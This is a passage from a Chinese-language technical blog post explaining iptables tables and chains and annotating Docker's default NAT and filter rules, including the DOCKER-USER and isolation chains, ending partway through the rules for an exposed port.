<p>本文并非小白所看懂的,有一定的门槛，如果不熟悉以下的前提，你可能看不懂本文，如果有什么困难请巩固基础，前提如下：</p>
</blockquote>
<ul>
<li>熟练使用iptables基本模块</li>
<li>熟练使用docker命令</li>
<li>熟练使用基本的docker网络</li>
<li>懂基本的docker网络</li>
<li>对net - namespace有一定的了解</li>
</ul>
<h1>本文内容不包括</h1>
<ul>
<li>veth - pair 技术</li>
<li>docker0网桥是啥</li>
<li>docker网络是啥</li>
<li>docker存储技术</li>
<li>docker计算资源</li>
<li>docker应用</li>
</ul>
<h1>本文内容仅包括</h1>
<ul>
<li>手撕iptables让一个docker容器上网，解释和说明为什么这样做。</li>
</ul>
<h1>什么是iptables</h1>
<p>简单的说就是：iptables 是一个简单、灵活、实用的命令行工具，可以用来配置、控制 linux 防火墙。</p>
<h2>iptables的五表五链及流量走向</h2>
<p>iptables中总共有4张表还有5条链，我们可以在链上加不同的规则。</p>
<p>五张表：filter表、nat表、mangle表、raw表、security表</p>
<p>五条链：prerouting、input、output、forward、postrouting</p>
<p></p>
<p>摘自iptables的wiki百科中的图</p>
<p></p>
<p>我知道很多人都看不懂，没关系，大家只要关注图中的蓝色部分：流量大走向如下：</p>
<p><code>raw prerouting</code> -&gt; <code>conntrack</code> -&gt; <code>mangle prerouting</code> -&gt; <code>nat prerouting</code> - &gt;<code>decision 路由选择</code> -&gt; 可能是input，也可能是output。</p>
<p></p>
<p>这并不复杂。但是在这想该怎么办之前，我们得先搞清楚，通常情况下我们会对流量做那些控制？无非如下：</p>
<ol>
<li>丢弃来自xxx的流量</li>
<li>丢弃去往xxx的流量</li>
<li>只接收来自xxx的流量</li>
<li>在刚流量流入时，将目标地址改写成其他地址</li>
<li>在流量即将流出前，将源地址改写成其他地址</li>
<li>将发往A的数据包，转发给B</li>
</ol>
<p>等等等等，如果你足够敏感，你就能发现，上面这六条干预策略，<code>filter</code>、<code>nat</code>这两张表已经完全能满足我们的需求了，我们只需要在这两张表的不同链上加自己的规则就行，如下：</p>
<ol>
<li>丢弃来自xxx的流量（<code>filter表INPUT链</code>）</li>
<li>丢弃去往xxx的流量（<code>filter表OUTPUT链</code>）</li>
<li>只接收来自xxx的流量（<code>filter表INPUT链</code>）</li>
<li>在刚流量流入时，将目标地址改写成其他地址（<code>nat表prerouting链</code>）</li>
<li>在流量即将流出前，将源地址改写成其他地址（<code>nat表postrouting链</code>）</li>
<li>将发往A的数据包，转发给B（<code>filter表forward链</code>）</li>
</ol>
<h1>docker iptables规则</h1>
<h2>默认的docker规则</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">##地址转发表nat中的规则链及默认</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">*nat</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#PREROUTING规则链默认策略是ACCEPT</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">:PREROUTING</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ACCEPT</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [2:104]</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#INPUT规则链默认策略是ACCEPT</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">:INPUT</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ACCEPT</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [2:104]</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#OUTPUT规则链默认策略是ACCEPT</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">:OUTPUT</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ACCEPT</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [12:817]</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#POSTROUTING规则链默认策略是ACCEPT</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">:POSTROUTING</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ACCEPT</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [12:817]</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#DOCKER规则链默认策略是ACCEPT</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">:DOCKER</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [0:0]</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#######################在PREROUTING规则链中添加的规则###########################</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">##-m表示使用扩展模块进行数据包匹配，到达本机的数据包，如果目标地址类型是本地局域网，则指定到DOCKER链</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> PREROUTING</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -m</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> addrtype</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --dst-type</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> LOCAL</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DOCKER</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#######################在OUTPUT规则链中添加的规则###########################</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> OUTPUT</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> !</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -d</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 127.0.0.0/8</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -m</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> addrtype</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --dst-type</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> LOCAL</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DOCKER</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#######################在POSTROUTING规则链中添加的规则###########################</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">##这条规则是为了使容器和外部网络通信</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#将源地址为172.17.0.0/16的包（也就是从Docker容器产生的包），并且不是从docker0网卡发出的</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#进行源地址转换，转换成主机网卡的地址。限制了容器实例的IP范围，这是为了区分Docker宿主机上有多个bridge网络的情况。</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> POSTROUTING</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -s</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 172.17.0.0/16</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> !</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> MASQUERADE</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">############################在DOCKER规则链中添加的规则###########################</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#由docker0接口输入的数据包，返回到调用链；-i指定了要处理来自哪个接口的数据包</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DOCKER</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -i</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> RETURN</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">###############################################################################</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">##规则表中的链及默认策略</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">*filter</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">:INPUT</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ACCEPT</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [310:29748]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">:FORWARD</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DROP</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [0:0]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">:OUTPUT</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ACCEPT</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [390:45516]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">:DOCKER</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [0:0]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">:DOCKER-ISOLATION-STAGE-1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [0:0]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">:DOCKER-ISOLATION-STAGE-2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [0:0]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">:DOCKER-USER</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [0:0]</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">############################在FORWARD规则链中添加的规则###########################</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">##数据包全部指定到DOCKER-USER链 # DOCKER-USER 为空</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> FORWARD</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DOCKER-USER</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">##数据包全部指定到DOCKER-ISOLATION-STAGE-1链</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> FORWARD</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DOCKER-ISOLATION-STAGE-1</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">## 状态</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> FORWARD</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -m</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> conntrack</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --ctstate</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> RELATED,ESTABLISHED</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ACCEPT</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">##由docker0接口输出的数据包，指定到DOCKER链</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> FORWARD</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DOCKER</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">##由docker0接口输入的数据包，且不是由docker0接口输出的数据包，允许通过</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> FORWARD</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -i</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> !</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ACCEPT</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">##由docker0接口输入的数据包，且由docker0接口输出的数据包，允许通过</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> FORWARD</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -i</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ACCEPT</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">####################在DOCKER-ISOLATION-STAGE-1规则链中添加的规则#################</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">##由docker0接口输入的数据包，且不是由docker0接口输出的数据包，指定到DOCKER-ISOLATION-STAGE-2链</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">##也就是要处理来自docker0的数据包，但是不是由docker0输出的数据包</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DOCKER-ISOLATION-STAGE-1</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -i</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> !</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DOCKER-ISOLATION-STAGE-2</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">##数据包直接返回到调用链</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DOCKER-ISOLATION-STAGE-1</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> RETURN</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">####################在DOCKER-ISOLATION-STAGE-2规则链中添加的规则#################</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">##由docker0接口输出的数据包，丢弃掉</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DOCKER-ISOLATION-STAGE-2</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DROP</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">##数据包直接返回到调用链</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DOCKER-ISOLATION-STAGE-2</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> RETURN</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">############################在DOCKER-USER规则链中添加的规则###########################</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">##直接返回到调用链</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DOCKER-USER</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> RETURN</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>Docker的DOCKER链</strong></p>
<p>仅处理从宿主机到docker0的IP数据包。</p>
<p><strong>Docker的DOCKER-ISOLATION链（隔离在不同的bridge网络之间的通信）</strong></p>
<p>可以看到，为了隔离在不同的bridge网络之间的通信，Docker提供了两个DOCKER-ISOLATION实现。</p>
<p>DOCKER-ISOLATION-STAGE-1链过滤源地址是bridge网络（默认docker0）的数据包，匹配的数据包再进入DOCKER-ISOLATION-STAGE-2链处理；</p>
<p>不匹配就返回到父链FORWARD。</p>
<p>在DOCKER-ISOLATION-STAGE-2链中，进一步处理目的地址是bridge网络(默认是docker0)的数据包，匹配的数据包表示该数据包是从一个bridge网络的网桥发出，到另一个bridge网络的网桥，这样的数据包来自其他bridge网络，将被直接DROP；</p>
<p>不匹配的数据包就返回到父链FORWARD继续进行后续处理。</p>
<p>Docker的DOCKER-USER链**</p>
<p>Docker启动时，会加载DOCKER链和DOCKER-ISOLATION（现在是DOCKER-ISOLATION-STAGE-1）链中的过滤规则，并使之生效。绝对禁止修改这里的过滤规则。</p>
<p>如果用户要补充Docker的过滤规则，强烈建议追加到DOCKER-USER链。</p>
<p>DOCKER-USER链中的过滤规则，将先于Docker默认创建的规则被加载（在上面的规则一览中，DOCKER_USER链被最早APPEND到规则链中），从而能够覆盖Docker在DOCKER链和DOCKER-ISOLATION链中的默认过滤规则。</p>
<p>例如，Docker启动后，默认任何外部source IP都被允许转发，从而能够从该source IP连接到宿主机上的任何Docker容器实例。如果只允许一个指定的IP访问容器实例，可以插入路由规则到DOCKER-USER链中，从而能够在DOCKER链之前被加载。</p>
<h2>当我暴露一个端口</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">*nat</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">:PREROUTING</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ACCEPT</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [0:0]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">:INPUT</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ACCEPT</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [0:0]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">:OUTPUT</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ACCEPT</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [0:0]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">:POSTROUTING</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ACCEPT</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [0:0]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">:DOCKER</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [0:0]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> PREROUTING</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -m</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> addrtype</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --dst-type</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> LOCAL</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DOCKER</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> OUTPUT</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> !</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -d</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 127.0.0.0/8</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -m</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> addrtype</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --dst-type</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> LOCAL</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DOCKER</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> POSTROUTING</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -s</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 172.17.0.0/16</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> !</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> MASQUERADE</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> POSTROUTING</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -s</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 172.17.0.2/32</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -d</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 172.17.0.2/32</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tcp</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -m</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tcp</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --dport</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 80</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> MASQUERADE</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DOCKER</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -i</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> RETURN</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DOCKER</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> !</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -i</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tcp</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -m</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tcp</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --dport</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 80</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DNAT</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --to-destination</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 